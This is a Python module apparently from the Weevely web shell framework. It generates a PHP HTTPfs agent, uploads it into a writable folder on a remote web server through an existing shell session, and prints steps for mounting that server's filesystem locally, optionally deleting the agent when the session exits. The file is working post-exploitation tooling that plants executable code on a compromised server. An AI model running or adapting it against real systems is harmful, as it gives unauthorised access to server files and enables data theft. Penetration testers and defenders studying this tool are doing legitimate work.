import atexit
import shutil
import subprocess
import tempfile

from mako import template

from weevely.core import messages
from weevely.core.loggers import log
from weevely.core.module import Module
from weevely.core.vectors import ModuleExec


class Mount(Module):
    """Mount remote filesystem using HTTPfs."""

    def init(self):
        self.register_info({"author": ["Emilio Pinna"], "license": "GPLv3"})

        self.register_arguments(
            [
                {
                    "name": "-rpath",
                    "help": "Remote web path where to save the agent. If it is a folder find the first writable folder in it",
                    "default": ".",
                },
                {"name": "-httpfs-binary", "default": "httpfs"},
                {
                    "name": "-no-autoremove",
                    "action": "store_true",
                    "default": False,
                    "help": "Do not autoremove on exit",
                },
            ]
        )

    def run(self, **kwargs):
        # Check binary
        binary_path = shutil.which(self.args["httpfs_binary"])

        if not binary_path:
            log.error(messages.module_file_mount.httpfs_s_not_found % self.args["httpfs_binary"])
            return

        # Generate PHP agent
        try:
            status = 0
            agent = subprocess.check_output([binary_path, "generate", "php"])
        except subprocess.CalledProcessError as e:
            status = e.returncode
            agent = ""

        if status or not agent:
            log.error(messages.module_file_mount.error_generating_agent)
            return

        # Save temporary PHP agent, and upload it
        temp_file = tempfile.NamedTemporaryFile(suffix=".php", prefix="", delete=False)
        temp_file.write(agent)
        # Without this flush() uploads only a
        # portion of the file
        temp_file.flush()

        result = ModuleExec("file_upload2web", [temp_file.name, self.args["rpath"]]).run()
        temp_file.close()

        if not result or not result[0] or len(result[0]) != 2 or not result[0][0] or not result[0][1]:
            log.error(messages.module_file_mount.failed_agent_upload)
            return

        self.args.update({"agent_abs_path": result[0][0], "agent_url": result[0][1]})

        log.warn(template.Template(messages.module_file_mount.agent_installed_tutorial).render(**self.args))

        if self.args["no_autoremove"]:
            log.warn(messages.module_file_mount.httpfs_agent_manually_remove_s % (result[0][0]))
        else:
            log.warn(messages.module_file_mount.httpfs_agent_removed)
            atexit.register(ModuleExec("file_rm", [result[0][0]]).run)
